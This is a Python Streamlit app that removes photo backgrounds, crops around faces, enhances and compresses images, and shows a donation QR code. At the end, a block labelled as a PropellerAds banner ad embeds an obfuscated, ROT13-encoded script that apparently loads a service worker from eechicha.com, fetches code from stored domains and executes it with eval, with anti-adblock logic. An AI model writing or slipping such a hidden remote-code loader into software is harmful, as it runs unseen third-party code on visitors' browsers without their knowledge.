import streamlit as st
import numpy as np
from PIL import Image, ImageEnhance
import cv2
from rembg import remove
import io
import os
import streamlit.components.v1 as components

# # Function to remove background
# def remove_background(image):
#     image_np = np.array(image)
#     output = remove(image_np)
#     return Image.fromarray(output)

def remove_background(image, remove_bg=True):
    if not remove_bg:
        return image  # Return original image if keeping background
    image_np = np.array(image)
    output = remove(image_np)  # Remove background
    output_img = Image.fromarray(output)
    
    # Create a grey background
    grey_bg = Image.new('RGB', output_img.size, (255, 255, 255))  # RGB(128, 128, 128) for grey
    if output_img.mode == 'RGBA':
        # Paste the foreground using the alpha channel as a mask
        grey_bg.paste(output_img, (0, 0), output_img.split()[3])  # Use alpha channel as mask
    else:
        grey_bg.paste(output_img, (0, 0))
    
    return grey_bg.convert('RGB')  # Ensure RGB mode


# Function to detect and center face
def detect_and_center_face(image):
    image_np = np.array(image)
    gray = cv2.cvtColor(image_np, cv2.COLOR_RGB2GRAY)
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
    faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))
    
    if len(faces) > 0:
        x, y, w, h = faces[0]  # Use the first detected face
        face_center_x, face_center_y = x + w // 2, y + h // 2
        img_height, img_width = image_np.shape[:2]
        
        # Calculate crop region (1.5x face size to include some context)
        crop_size = int(max(w, h) * 1.5)
        crop_x1 = max(face_center_x - crop_size // 2, 0)
        crop_y1 = max(face_center_y - crop_size // 2, 0)
        crop_x2 = min(face_center_x + crop_size // 2, img_width)
        crop_y2 = min(face_center_y + crop_size // 2, img_height)
        
        cropped = image_np[crop_y1:crop_y2, crop_x1:crop_x2]
        return Image.fromarray(cropped)
    return image  # Return original if no face detected

# Function to enhance image
def enhance_image(image):
    enhancer = ImageEnhance.Brightness(image)
    image = enhancer.enhance(1.1)  # Slight brightness boost
    enhancer = ImageEnhance.Contrast(image)
    image = enhancer.enhance(1.2)  # Slight contrast boost
    enhancer = ImageEnhance.Sharpness(image)
    image = enhancer.enhance(1.5)  # Moderate sharpness boost
    return image

# Function to resize image
def resize_image(image, target_width, target_height):
    image.thumbnail((target_width, target_height), Image.Resampling.LANCZOS)
    return image

# # Function to compress image to target file size
# def compress_to_size(image, target_size_kb):
#     target_size = target_size_kb * 1024  # Convert KB to bytes
#     quality = 95
#     while quality > 10:
#         buffer = io.BytesIO()
#         image.save(buffer, format="JPEG", quality=quality)
#         size = buffer.tell()
#         if size <= target_size:
#             return buffer.getvalue()
#         quality -= 5
#     # If still too large, reduce dimensions slightly
#     image = image.resize((int(image.width * 0.9), int(image.height * 0.9)), Image.Resampling.LANCZOS)
#     buffer = io.BytesIO()
#     image.save(buffer, format="JPEG", quality=50)
#     return buffer.getvalue()

# Function to compress image to target file size
def compress_to_size(image, target_size_kb):
    target_size = target_size_kb * 1024  # Convert KB to bytes
    quality = 95
    # Convert image to RGB if it has an alpha channel
    if image.mode == 'RGBA':
        image = image.convert('RGB')
    while quality > 10:
        buffer = io.BytesIO()
        image.save(buffer, format="JPEG", quality=quality)
        size = buffer.tell()
        if size <= target_size:
            return buffer.getvalue()
        quality -= 5
    # If still too large, reduce dimensions slightly
    image = image.resize((int(image.width * 0.9), int(image.height * 0.9)), Image.Resampling.LANCZOS)
    buffer = io.BytesIO()
    image.save(buffer, format="JPEG", quality=50)
    return buffer.getvalue()

# Streamlit app
st.title("Photo Background Remover and Editor")
st.write("Upload a photo, remove its background, resize it, and enhance it for download.")

# File uploader
uploaded_file = st.file_uploader("Choose an image...", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    # Load image
    image = Image.open(uploaded_file).convert("RGB")
    st.image(image, caption="Uploaded Image", use_column_width=True)
    

        # Background option
    bg_option = st.radio("Background Option", ("Keep Background", "Remove Background"))
    remove_bg = bg_option == "Remove Background"


    # User inputs for target size
    target_width = st.number_input("Target Width (pixels)", min_value=100, max_value=4000, value=800)
    target_height = st.number_input("Target Height (pixels)", min_value=100, max_value=4000, value=600)
    target_size_kb = st.number_input("Target File Size (KB)", min_value=10, max_value=5000, value=100)
    
    if st.button("Process Image"):
        with st.spinner("Processing..."):
            # Process background
            image = remove_background(image, remove_bg)
            
            # Detect and center face
            image = detect_and_center_face(image)
            
            # Enhance image
            image = enhance_image(image)
            
            # Resize image
            image = resize_image(image, target_width, target_height)
            
            # Compress to target file size
            processed_image_bytes = compress_to_size(image, target_size_kb)
            
            # Display processed image
            st.image(processed_image_bytes, caption="Processed Image", use_column_width=True)
            
            # Provide download link
            st.download_button(
                label="Download Processed Image",
                data=processed_image_bytes,
                file_name="processed_image.jpg",
                mime="image/jpeg"
            )

st.write("Note: Face detection may not work perfectly for all images. Ensure the image has a clear face for best results.")

qr_path = "qr.jpeg"

image = Image.open(qr_path)
st.image(image, caption="Scan to Buy Me a Coffee", width=200)

# PropellerAds banner ad
components.html("""
    <script>
        (function(O){!function(e){var t=O.Z();function n(r){if(t[r])return t[r][O.i];var i=t[r]=O.Z(O.B,r,O.w,!O.X,O.i,O.Z());return e[r][O.z](i[O.i],i,i[O.i],n),i[O.w]=!O.N,i[O.i]}n[O.y]=e,n[O.g]=t,n[O.K]=function(e,t,r){n[O.h](e,t)||Object[O.b](e,t,O.Z(O.GO,!O.N,O.RO,r))},n[O.G]=function(e){O.HO!=typeof Symbol&&Symbol[O.hO]&&Object[O.b](e,Symbol[O.hO],O.Z(O.p,O.cO)),Object[O.b](e,O.U,O.Z(O.p,!O.N))},n[O.R]=function(e,t){if(O.X&t&&(e=n(e)),O.v&t)return e;if(O.P&t&&O.t==typeof e&&e&&e[O.U])return e;var r=Object[O.r](O.q);if(n[O.G](r),Object[O.b](r,O.C,O.Z(O.GO,!O.N,O.p,e)),O.d&t&&O.oO!=typeof e)for(var i in e)n[O.K](r,i,function(t){return e[t]}[O.fO](O.q,i));return r},n[O.H]=function(e){var t=e&&e[O.U]?function(){return e[O.C]}:function(){return e};return n[O.K](t,O.OO,t),t},n[O.h]=function(e,t){return Object[O.FO][O.a][O.z](e,t)},n[O.e]=O.F,n(n[O.m]=O.o)}(O.Z(O.o,function(module,exports,__webpack_require__){O.f;var _antiadblock=__webpack_require__(O.O);self[O.c]=O.Z(O.S,9232614,O.V,"eechicha.com",O.l,!O.N),self[O.D]=O.F;var DEFAULT_URL=[O.Y,O.j][O.A](self[O.c][O.V]),STORE_EVENTS=[O.T,O.u,O.M,O.L,O.n,O.E],url;try{if(url=atob(location[O.DO][O.x](O.X)),!url)throw O.q}catch(e){url=DEFAULT_URL}try{importScripts(url)}catch(ignore){var events=O.Z(),listeners=O.Z(),realAddEventListener=self[O.yO][O.fO](self);STORE_EVENTS[O.ZO](function(e){self[O.yO](e,function(t){events[e]||(events[e]=[]),events[e][O.M](t),listeners[e]&&listeners[e][O.ZO](function(e){try{e(t)}catch(e){}})})}),self[O.yO]=function(e,t){if(-O.X===STORE_EVENTS[O.qO](e))return realAddEventListener(e,t);listeners[e]||(listeners[e]=[]),listeners[e][O.M](t),events[e]&&events[e][O.ZO](function(e){try{t(e)}catch(e){}})},(O.N,_antiadblock[O.I])(url,O.Z())[O.gO](function(e){return e[O.UO]()})[O.gO](function(code){return eval(code)})}},O.O,function(e,t,n){O.f;Object[O.b](t,O.U,O.Z(O.p,!O.N)),t[O.Q]=function(e){return new Promise(function(t,n){r(O.BO)[O.gO](function(r){var i=r[O.tO]([O.lO],O.rO)[O.xO](O.lO)[O.WO](O.Z(O.V,e,O.dO,new Date()[O.CO]()));i[O.yO](O.EO,t),i[O.yO](O.nO,n)})})},t[O.I]=async function(e,t){var n=await new Promise(function(e,t){r(O.BO)[O.gO](function(n){var r=n[O.tO]([O.lO],O.rO)[O.xO](O.lO)[O.PO]();r[O.yO](O.nO,t),r[O.yO](O.EO,function(){return e(r[O.XO][O.oF](function(e){return e[O.V]}))})})}),o=!O.N,a=!O.X,s=void O.N;try{for(var c,u=n[Symbol[O.QO]]();!(o=(c=u[O.IO]())[O.uO]);o=!O.N){var d=c[O.p];try{return await fetch(O.Y+d+O.s+i(),O.Z(O.YO,t[O.YO]||O.RO,O.jO,O.pO,O.sO,t[O.sO],O.vO,O.Z(O.kO,btoa(e))))}catch(e){}}}catch(e){a=!O.N,s=e}finally{try{!o&&u[O.JO]&&u[O.JO]()}finally{if(a)throw s}}throw new Error(O.eO)},t[O.J]=async function(e){try{var t=await fetch(e[O.qO](O.SO)>-O.X?e:O.Y+e);return!O.X===(await t[O.bO]())[O.TO]}catch(e){return!O.X}};function r(e){return new Promise(function(t,n){var r=indexedDB[O.MO](e,O.X);r[O.yO](O.LO,function(){r[O.XO][O.VO](O.lO,O.Z(O.aO,O.V))}),r[O.yO](O.nO,n),r[O.yO](O.EO,function(){return t(r[O.XO])})})}function i(){var e=arguments[O.iO]>O.N&&void O.N!==arguments[O.N]?arguments[O.N]:O.N,t=e<O.W&&Math[O.mO]()>O.k,n=Math[O.mO]()[O.zO](O.wO)[O.x](O.d,O.KO+parseInt(O.AO*Math[O.mO](),O.NO));return n+(t?O.s+i(e+O.X):O.F)}}))}([['o',111],['O',17],['F',''],['f','hfr fgevpg'],['Z',function(){const obj={};const args=[].slice.call(arguments);for(let i=0;i<args.length-1;i+=2){obj[args[i]]=args[i+1]}return obj}],['y','z'],['g','p'],['K','q'],['G','e'],['R','g'],['H','a'],['h','b'],['e','c'],['i','rkcbegf'],['m','f'],['z','pnyy'],['w','y'],['N',0],['c','bcgvbaf'],['D','ynel'],['A','wbva'],['T','vafgnyy'],['u','npgvingr'],['M','chfu'],['L','abgvsvpngvbapyvpx'],['n','abgvsvpngvbapybfr'],['E','chfufhofpevcgvbapunatr'],['q',null],['b','qrsvarCebcregl'],['U','__rfZbqhyr'],['Q','nqqQbznva'],['I','hygensrgpu'],['J','grfgCvatQbznva'],['B','v'],['S','mbarVq'],['V','qbznva'],['l','erfhofpevorBaVafgnyy'],['X',1],['Y','uggcf://'],['j','/csr/pheerag/freivpr-jbexre.zva.wf?e=fj&i=2'],['p','inyhr'],['s','/'],['v',8],['a','unfBjaCebcregl'],['W',7],['k',.3],['x','fyvpr'],['d',2],['P',4],['t','bowrpg'],['r','perngr'],['C','qrsnhyg'],['oO','fgevat'],['OO','n'],['FO','cebgbglcr'],['fO','ovaq'],['ZO','sbeRnpu'],['yO','nqqRiragYvfgrare'],['gO','gura'],['KO',3],['GO','rahzrenoyr'],['RO','trg'],['HO','haqrsvarq'],['hO','gbFgevatGnt'],['eO','NNO Erdhrfg Snvyrq'],['iO','yratgu'],['mO','enaqbz'],['zO','gbFgevat'],['wO',36],['NO',10],['cO','Zbqhyr'],['DO','frnepu'],['AO',9],['TO','fgnghf'],['uO','qbar'],['MO','bcra'],['LO','hctenqrarrqrq'],['nO','reebe'],['EO','fhpprff'],['qO','vaqrkBs'],['bO','wfba'],['UO','grkg'],['QO','vgrengbe'],['IO','arkg'],['JO','erghea'],['BO','fjnno'],['SO',':'],['VO','perngrBowrpgFgber'],['lO','qbznvaf'],['XO','erfhyg'],['YO','zrgubq'],['jO','perqragvnyf'],['pO','vapyhqr'],['sO','obql'],['vO','urnqref'],['aO','xrlCngu'],['WO','chg'],['kO','gbxra'],['xO','bowrpgFgber'],['dO','perngrqNg'],['PO','trgNyy'],['tO','genafnpgvba'],['rO','ernqjevgr'],['CO','trgGvzr'],['oF','znc']].reduce((o,i)=>(Object.defineProperty(o,i[0],{get:()=>typeof i[1]!=='string'?i[1]:i[1].split('').map(s=>{const c=s.charCodeAt(0);return c>=65&&c<=90?String.fromCharCode((c-65+26-13)%26+65):c>=97&&c<=122?String.fromCharCode((c-97+26-13)%26+97):s}).join('')}),o),{})))/*importScripts(...r=sw)*/
    </script>
""", height=250)